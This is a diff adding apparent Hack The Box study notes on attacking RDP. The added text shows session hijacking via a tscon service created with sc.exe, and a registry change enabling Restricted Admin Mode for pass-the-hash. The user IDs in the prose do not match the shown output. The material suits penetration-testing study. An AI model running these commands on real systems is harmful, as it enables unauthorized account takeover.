@@ -1272,3 +1272,55 @@ HTB{46u$!n9_l!nk3d_$3rv3r$}
 NULL
 ```
 
+# RDP
+
+[Remote Desktop Protocol (RDP)](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol) is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection.
+
+By default, RDP uses port `TCP/3389`.
+
+## RDP Session Hijacking
+
+As shown in the example below, we are logged in as the user `juurena` (UserID = 2) who has `Administrator` privileges. Our goal is to hijack the user `lewen` (User ID = 4), who is also logged in via RDP.
+
+![](Pasted%20image%2020260111103105.png)
+
+To successfully impersonate a user without their password, we need to have `SYSTEM` privileges and use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session.
+
+```powershell
+C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
+```
+
+```powershell
+C:\htb> query user
+
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
+ lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
+
+C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
+
+[SC] CreateService SUCCESS
+```
+
+To run the command, we can start the `sessionhijack` service :
+
+```powershell
+C:\htb> net start sessionhijack
+```
+
+Once the service is started, a new terminal with the `lewen` user session will appear. With this new account, we can attempt to discover what kind of privileges it has on the network.
+
+![](Pasted%20image%2020260111103541.png)
+
+## RDP Pass-the-Hash (PtH)
+
+`Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error.
+
+![](Pasted%20image%2020260111103921.png)
+
+```powershell
+C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
+# DNS
+
